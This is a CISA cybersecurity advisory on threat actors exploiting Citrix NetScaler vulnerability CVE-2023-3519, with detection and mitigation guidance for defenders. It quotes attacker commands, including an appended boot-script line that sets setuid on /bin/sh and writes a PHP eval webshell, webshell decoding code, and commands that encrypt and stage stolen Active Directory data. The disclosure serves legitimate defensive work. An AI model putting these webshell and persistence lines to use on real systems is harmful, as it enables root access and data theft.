[Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94) Cybersecurity AdvisoryThreat Actors Exploiting Citrix CVE\\-2023\\-3519 to Implant Webshells==================================================================== Release Date July 20, 2023 Alert Code AA23\\-201A Related topics: , [Information Sharing](/topics/cyber-threats-and-advisories/information-sharing)  ,### **SUMMARY**##### ***Update September 6, 2023:*** This Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.##### ***Update End*** The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE\\-2023\\-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero\\-day to drop a webshell on a critical infrastructure organization\u2019s non\\-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim\u2019s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network\\-segmentation controls for the appliance blocked movement. The victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023\\. This advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.

The actors used the webshell for AD enumeration \\[ [T1016](https://attack.mitre.org/versions/v13/techniques/T1016 \"System Network Configuration Discovery\")  ] and to exfiltrate AD data \\[ [TA0010](https://attack.mitre.org/versions/v13/tactics/TA0010/ \"Exfiltration \")  ]. Specifically, the actors:* Viewed NetScaler configuration files `/flash/nsconfig/keys/updated/*`  and `/nsconfig/ns.conf`  \\[ [T1005](https://attack.mitre.org/versions/v13/techniques/T1005 \"Data from Local System\")  ]. **Note:**  These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance \\[ [T1552\\.001](https://attack.mitre.org/versions/v13/techniques/T1552/001 \"Unsecured Credentials: Credentials In Files\")  ].* Viewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file) \\[ [T1552\\.004](https://attack.mitre.org/versions/v13/techniques/T1552/004/ \"Unsecured Credentials: Private Keys\")  ].* Used the decrypted AD credential to query the AD via `ldapsearch`  . The actors queried for:\t+ Users (\t `objectClass=user` \t ) (\t `objectcategory=person` \t ) \\[\t [T1033](https://attack.mitre.org/versions/v13/techniques/T1033/ \"System Owner/User Discovery\") \t ]\t+ Computers (\t `objectClass=computer` \t ) \\[\t [T1018](https://attack.mitre.org/versions/v13/techniques/T1018/ \"Remote System Discovery\") \t ]\t+ Groups (\t `objectClass=group` \t ) \\[\t [T1069\\.002](https://attack.mitre.org/versions/v13/techniques/T1069/002/ \"Permission Groups Discovery: Domain Groups\") \t ]\t+ Subnets (\t `objectClass=subnet` \t )\t+ Organizational Units (\t `objectClass=organizationalUnit` \t )\t+ Contacts (\t `objectClass=contact` \t )\t+ Partitions (\t `objectClass=partition` \t )\t+ Trusts (\t `objectClass=trustedDomain` \t ) \\[\t [T1482](https://attack.mitre.org/versions/v13/techniques/T1482/ \"Domain Trust Discovery\") \t ]* Used the following command to encrypt discovery data collected via openssl in \u201ctar ball\u201d \\[ [T1560\\.001](https://attack.mitre.org/versions/v13/techniques/T1560/001 \"Archive Collected Data: Archive via Utility\")  ]: `tar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz`  . (A \u201ctar ball\u201d is a compressed and zipped file used by threat actors for collection and exfiltration.)* Exfiltrated collected data by uploading as an image file\u00a0\\[ [T1036\\.008](https://attack.mitre.org/versions/v13/techniques/T1036/008/ \"Masquerading: Masquerade File Type\")  ] to a web\\-accessible path \\[ [T1074](https://attack.mitre.org/versions/v13/techniques/T1074/)  ]: `cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png`  . The actors\u2019 other discovery activities were unsuccessful due to the critical infrastructure organization\u2019s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:* Execute a subnet\\-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.* Verified outbound network connectivity with a ping command ( `ping -c 1 google.com`  ) \\[ [T1016\\.001](https://attack.mitre.org/versions/v13/techniques/T1016/001/ \"System Network Configuration Discovery: Internet Connection Discovery\")  ].* Executed host commands for a subnet\\-wide DNS lookup. The actors also attempted to delete their artifacts \\[ [TA0005](https://attack.mitre.org/versions/v13/tactics/TA0005/ \"Defense Evasion\")  ]. The actors deleted the authorization configuration file ( `/etc/auth.conf`  )\u2014likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI) \\[ [T1531](https://attack.mitre.org/versions/v13/techniques/T1531/ \"Account Access Removal\")  ]. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it. The actors\u2019 post\\-exploitation lateral movement attempts were also blocked by network\\-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC \\[ [T1090\\.001](https://attack.mitre.org/versions/v13/techniques/T1090/001/ \"Proxy: Internal Proxy\")  ] (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.##### ***Update September 6, 2023:***##### *Victim 2* Threat actors uploaded a PHP webshell `*logouttm.php*`  \\[ [T1036\\.005](https://attack.mitre.org/versions/v13/techniques/T1036/005/ \"Masquerading: Match Legitimate Name or Location\")  ], likely as part of their initial exploit chain, to `*/netscaler/ns_gui/vpn/`  . Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary `pykeygen`  that set user unique identifier (UID) to root and executed `/bin/sh`  \\[ [T1059\\.004](https://attack.mitre.org/versions/v13/techniques/T1059/004/ \"Command and Scripting Interpreter: Unix Shell\")  ] via `setuid`  and `execve syscall.*`  \\[ [T1106](https://attack.mitre.org/versions/v13/techniques/T1106/ \"Native API\")  ]. **Note:**  A third party also observed threat actors use an ELF binary (named `pip4`  ) to execute `/bin/sh`  via `syscall`  and change the UID to root. `pip4`  was located at `/var/python/bin`  . With root level access, the actors used hands\\-on\\-keyboard for discovery. They queried the AD via `ldapsearch`  for users, groups, and computers.\u00a0They collected the data in gzipped text files renamed `1.css`  and `2.css`  and placed the files in `/netscaler/ns_gui/vpn/`  for exfiltration. After exfiltrating the files,\u00a0the actors deleted them from the system \\[ [T1070\\.004](https://attack.mitre.org/versions/v13/techniques/T1070/004 \"Indicator Removal: File Deletion\")  ] as well as some access logs, error logs, and authentication logs \\[ [T1070\\.002](https://attack.mitre.org/versions/v13/techniques/T1070/002 \"Indicator Removal: Clear Linux or Mac System Logs\")  ].\u00a0The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity. For command and control (C2\\), the actors appeared to use compromised pfSense devices \\[ [T1584](https://attack.mitre.org/versions/v13/techniques/T1584/ \"Compromise Infrastructure\")  ]; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi\\-hop proxying C2 traffic \\[ [T1090\\.003](https://attack.mitre.org/versions/v13/techniques/T1090/003/ \"Proxy: Multi-hop Proxy\")  ].##### *Additional Observed Activity* According to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools \\[ [T1588\\.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/ \"Obtain Capabilities: Tool\")  ]:* Loaded `loading[.]php`  to `/vpn/vpn/`  . `Loading[.]php`  is a modified version of an open\\-source PHP webshell \\[ [2](https://github.com/dxkite/php-stream-shell \"dxkite / php-stream-shell\")  ]. The modified webshell had a custom protocol handler, `update://`  , created via a `stream_wrapper_register`  (https://www.php.net/manual/en/function.stream\\-wrapper\\-register\\[.]php). The custom protocol enabled the webshell to send encoded commands to the AD via `ldapsearch`  :| `public function stream_open($path, $mode, $options, &$opened_path)`    `{`    `$this->code = hex2bin(substr(base64_decode(strrev(substr(substr($path,9),5))),2));`    `$this->position = 0;`    `return true;`    `}` || --- |* Loaded a modified version of open\\-source SSH inject tool \\[ [3](https://github.com/xpn/ssh-inject/blob/master/injectme.c \"xpn / ssh-inject\")  ] named libnsd.so to the `/tmp`  directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters \\+ reversed/base64\\) to a file created in a hard\\-coded path ( `/var/nslog/counters/prometheus/metrc_codes_client.log`  ) \\[ [T1074\\.001](https://attack.mitre.org/versions/v13/techniques/T1074/001/ \"Data Staged: Local Data Staging\")  ]. The actors then exfiltrated the collected credentials and deleted `/var/nslog/counters/prometheus/metrc_codes_client.log`  3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors\u2019 memory hook was still active.)* Deployed webshells to victim networks at `\\vpn\\themes`  .\t+ One third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an\t `HTTP POST` \t request, decrypt it using an internally embedded RSA public key \\[\t [T1140](https://attack.mitre.org/versions/v13/techniques/T1140/) \t ], and execute the code in memory; each request to the webshell returns an\t `HTTP 500` \t response code. The actor has used the following file names for SECRETSAUCE:\t `vpn[.]php` \t ,\t `logout[.]php` \t ,\t `log[.]php` \t ,\t `prod[.]php` \t \\[\t [T1036](https://attack.mitre.org/versions/v13/techniques/T1036/ \"Masquerading\") \t ].\t+ A second third party observed the actors deploy an open source webshell \\[\t [4](https://github.com/L-codes/Neo-reGeorg \"L-codes / Neo-reGeorg\") \t ] with filename\t `defaults.php` \t .* Deployed LIGOLO\\-NG \\[ [5](https://github.com/Nicocha30/ligolo-ng \"nicocha30 / ligolo-ng\")  ] tunneller with the filename `the`  in the `/tmp`  directory. LIGOLO\\-NG is a tunneller \\[ [T1572](https://attack.mitre.org/versions/v13/techniques/T1572/ \"Protocol Tunneling\")  ] written in Go that provides encrypted reverse TCP/TLS connections \\[ [T1573\\.002](https://attack.mitre.org/versions/v13/techniques/T1573/002/ \"Encrypted Channel: Asymmetric Cryptography\")  ] to a remote host.* Deployed the NPS tunneller \\[ [6](https://github.com/ehang-io/nps \"ehang-io / nps\")  ] to victim networks to the `/tmp`  directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse. Additionally, threat actors:* Appended `/flash/nsconfig/rc.netscaler`  with:`chmod u+s /bin/sh` `echo \u201c<?php http_response_code(401);@eval(\\$_REQUEST[\u2018variable\u2019]);?>\u201d > /[redacted path to webshell]/[redacted].php`  \\[ [T1222\\.002](https://attack.mitre.org/versions/v13/techniques/T1222/002/ \"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\")  ]. The webshell path was in a web accessible folder, and the actors\u2019 modifications enabled them to run `/bin/sh`  commands as root and enabled persistence because the webshell was run on every reboot \\[ [T1547](https://attack.mitre.org/versions/v13/techniques/T1547/ \"Boot or Logon Autostart Execution\")  ].* Used Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD \\[ [7](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer \"Active Directory Explorer v1.52\")  ]. The actors dropped the tool to `C:\\Users\\<redacted>\\AppData\\Local\\Temp\\` `ADExplorer.exe`  and executed it with the following command: `ADExplorer.exe -snapshot \"\" <filename>.dat /accepteula`

Check for files newer than the last installation.2. Modify the `-newermt`  parameter with the date that corresponds to your last installation:\t* `find /netscaler/ns_gui/ -type f -name *.php -newermt [YYYYMMDD] -exec ls -l {} \\;`\t* `find /var/vpn/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`\t* `find /var/netscaler/logon/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`\t* `find /var/python/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;`3. Check http error logs for abnormalities that may be from initial exploit:\t* `zgrep '\\.sh' /var/log/httperror.log*`\t* `zgrep '\\.php' /var/log/httperror.log*`4. Check shell logs for unusual `post-ex`  commands, for example:\t* `grep '/flash/nsconfig/keys' /var/log/sh.log*`5. Look for `setuid`  binaries dropped:\t* `find /var -perm -4000 -user root -not -path \"/var/nslog/*\" -newermt [YYYYMMDD] -exec ls -l {} \\;`6. Review network and firewall logs for subnet\\-wide scanning of HTTP/HTTPS/SMB (80/443/445\\) originating from the ADC.7. Review DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post\\-AD enumeration of computer objects).8. Review network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).9. Review number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).10. Pay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.11. Review AD logs for logon activities originating from the ADC IP with the account configured for AD connection.12. If logon restriction is configured for the AD account, check event `4625`  where the failure reason is \u201cUser not allowed to logon at this computer.\u201d13. Review NetScaler ADC internal logs ( `sh.log*`  , `bash.log*`  ) for traces of potential malicious activity (some example keywords for `grep`  are provided below):\t* `database.php`\t* `ns_gui/vpn`\t* `/flash/nsconfig/keys/updated`\t* `LDAPTLS_REQCERT`\t* `ldapsearch`\t* `openssl + salt`14. Review NetScaler ADC internal access logs ( `httpaccess-vpn.log*`  ) for 200 successful access of unknown web resources.##### ***Update September 6, 2023:*** The following resources may assist with detecting signs of compromise:* Mandiant: [Exploitation of Citrix Zero\\-Day by Possible Espionage Actors (CVE\\-2023\\-3519\\)](https://www.mandiant.com/resources/blog/citrix-zero-day-espionage \"Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)\")* GreyNoise: [Will the real Citrix CVE\\-2023\\-3519 please stand up?](https://www.greynoise.io/blog/will-the-real-citrix-cve-2023-3519-please-stand-up \"Will the real Citrix CVE-2023-3519 please stand up?\")* Shadowserver: [Technical Summary of Observed Citrix CVE\\-2023\\-3519 Incidents](https://www.shadowserver.org/news/technical-summary-of-observed-citrix-cve-2023-3519-incidents/ \"Technical Summary of Observed Citrix CVE-2023-3519 Incidents\")* Mandiant: [Indicators of Compromise Scanner for Citrix ADC Zero\\-Day (CVE\\-2023\\-3519\\)](https://www.mandiant.com/resources/blog/citrix-adc-vulnerability-ioc-scanner \"Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)\")* ***(Update October 6, 2023\\)*** IBM: [X\\-Force uncovers global NetScaler Gateway credential harvesting campaign](https://securityintelligence.com/posts/x-force-uncovers-global-netscaler-gateway-credential-harvesting-campaign/ \"X-Force uncovers global NetScaler Gateway credential harvesting campaign\")##### ***End Update***##### ***Update September 6, 2023*** :### **INDICATORS OF COMPROMISE** See Table 12 for IOCs obtained from Victim 2\\.

For additional best practices, see CISA\u2019s [Cross\\-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals \"Cross-Sector Cybersecurity Performance Goals\")  (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).* As a longer\\-term effort, **apply robust network\\-segmentation controls on NetScaler appliances**  , and other internet\\-facing devices.### **VALIDATE SECURITY CONTROLS** In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT\\&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT\\&CK techniques described in this advisory. To get started:1. Select an ATT\\&CK technique described in this advisory (see Table 1\u2013Table 11\\).2. Align your security technologies against the technique.3. Test your technologies against the technique.4. Analyze your detection and prevention technologies\u2019 performance.5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.6. Tune your security program, including people, processes, and technologies, based on the data generated by this process. CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT\\&CK techniques identified in this advisory.### **REFERENCES** \\[1] Citrix Security Bulletin CTX561482: [Citrix ADC and Citrix Gateway Security Bulletin for CVE\\-2023\\-3519, CVE\\-2023\\-3466, CVE\\-2023\\-3467](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") ##### ***Update September 6, 2023:*** \\[2] [GitHub \\- dxkite/php\\-stream\\-shell: a simple stream\\_wrapper shell](https://github.com/dxkite/php-stream-shell \"dxkite / php-stream-shell\")  \\[3] [GitHub \\- ssh\\-inject/injectme.c](https://github.com/xpn/ssh-inject/blob/master/injectme.c \"xpn / ssh-inject\")  \\[4] [GitHub \\- L\\-codes/Neo\\-reGeorg: Neo\\-reGeorg is a project that seeks to aggressively refactor reGeorg](https://github.com/L-codes/Neo-reGeorg \"L-codes / Neo-reGeorg\")  \\[5] [GitHub \\- nicocha30/ligolo\\-ng](https://github.com/Nicocha30/ligolo-ng \"nicocha30 / ligolo-ng\")  \\[6] [GitHub \\- ehang\\-io/nps](https://github.com/ehang-io/nps \"ehang-io / nps\")  \\[7] Microsoft: [AD Explorer \\- Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer \"Active Directory Explorer v1.52\") ##### ***End Update***##### ***Update September 6, 2023:***### **ACKNOWLEDGEMENTS** Mandiant and Shadowserver contributed to this Cybersecurity Advisory.##### ***End Update***### **VERSION HISTORY****July 20, 2023:**  Initial version.**July 24, 2023:**  Updated affected NetScaler ADC 12\\.1\\-FIPS and NetScaler ADC 12\\.1\\-NDcPP version numbers.
